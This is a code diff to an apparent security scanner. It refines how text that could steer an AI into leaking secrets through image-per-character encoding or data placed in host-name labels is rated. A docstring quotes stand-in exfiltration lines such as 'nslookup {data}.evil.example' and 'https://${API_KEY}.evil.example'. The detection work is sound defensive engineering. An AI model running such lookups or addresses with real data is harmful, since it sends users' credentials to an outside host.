@@ -1631,13 +1631,24 @@ def _image_alphabet_finding(text: str) -> Finding | None:
     if len(images) < 2:
         return None
     span = _alphabet_span(images)
+    order = _ONE_IMAGE_PER_CHARACTER.search(text)
     if span is None:
-        order = _ONE_IMAGE_PER_CHARACTER.search(text)
         span = order.span() if order else None
     if span is None:
         return None
-    severity = "high" if _secret_named_near(text, *span) else "medium"
+    # High when a secret is named and the text orders it written in images: one per character, or spelled
+    # or put into them. A row of flags next to "your API token" names a secret and orders nothing.
+    ordered = order is not None or _SPELL_OR_FILL_IN.search(_sentence_outside(text, *span)) is not None
+    severity = "high" if ordered and _secret_named_near(text, *span) else "medium"
     return Finding("image_alphabet", severity, _excerpt(text, *span))
+
+
+# An order to write something out in images or a host name (with _FILL_IN): spell it, encode it, write it out.
+_SPELL_OR_FILL_IN = re.compile(
+    _FILL_IN.pattern + r"|\b(?:spell(?:s|ed|ing)?|transcrib(?:e|es|ed|ing)|writ(?:e|es|ing) (?:it |them )?out)\b"
+)
+# Words that put something in the place of a slot ("with the token in its place").
+_IN_ITS_PLACE = re.compile(r"\b(?:in (?:its|their|the) place|in place of|instead of)\b")
 
 
 def _alphabet_span(images: list[re.Match[str]]) -> tuple[int, int] | None:
@@ -1703,7 +1714,16 @@ def _encoded_label(host: str) -> bool:
 
 
 def _host_label_finding(text: str) -> Finding | None:
-    """encoded_host_label: a host name, in an address or after a network command, with data in a label."""
+    """encoded_host_label: a host name, in an address or after a network command, with data in a label.
+
+    High when a secret is named in its sentence and the host is one a
+    command looks up ("nslookup {data}.evil.example"), or its slot names a
+    secret ("https://${API_KEY}.evil.example"), or the sentence orders
+    something put there ("... with the token in its place"). An address in
+    API documentation has a slot for the customer's own name
+    ("https://{your-domain}.atlassian.net") and often names the API token
+    it needs, without ordering the token put into the name.
+    """
     lowered = text.lower()
     patterns = [_URL_HOST] if "://" in text else []
     if any(command in lowered for command in _NETWORK_COMMANDS):
@@ -1713,11 +1733,22 @@ def _host_label_finding(text: str) -> Finding | None:
         host = match.group("host")
         if "." not in host or not _encoded_label(host):
             continue
-        excerpt = _excerpt(text, *match.span("host"))
-        if _secret_named_near(text, *match.span("host")):
+        span = match.span("host")
+        excerpt = _excerpt(text, *span)
+        if _secret_named_near(text, *span) and _ordered_into_the_host(text, match, span):
             return Finding("encoded_host_label", "high", excerpt)
         medium = medium or Finding("encoded_host_label", "medium", excerpt)
     return medium
+
+
+def _ordered_into_the_host(text: str, match: re.Match[str], span: tuple[int, int]) -> bool:
+    """Whether data is to go into the host name of `match`: see `_host_label_finding`."""
+    if match.re is _COMMAND_HOST:
+        return True
+    if any(_SECRET_WORD.search(slot.lower()) for slot in _HOST_PLACEHOLDER.findall(match.group("host"))):
+        return True
+    sentence = _sentence_outside(text, *span)
+    return _SPELL_OR_FILL_IN.search(sentence) is not None or _IN_ITS_PLACE.search(sentence) is not None
 
 
 # Terminal sequences that hide or rewrite what a person sees (colours alone do
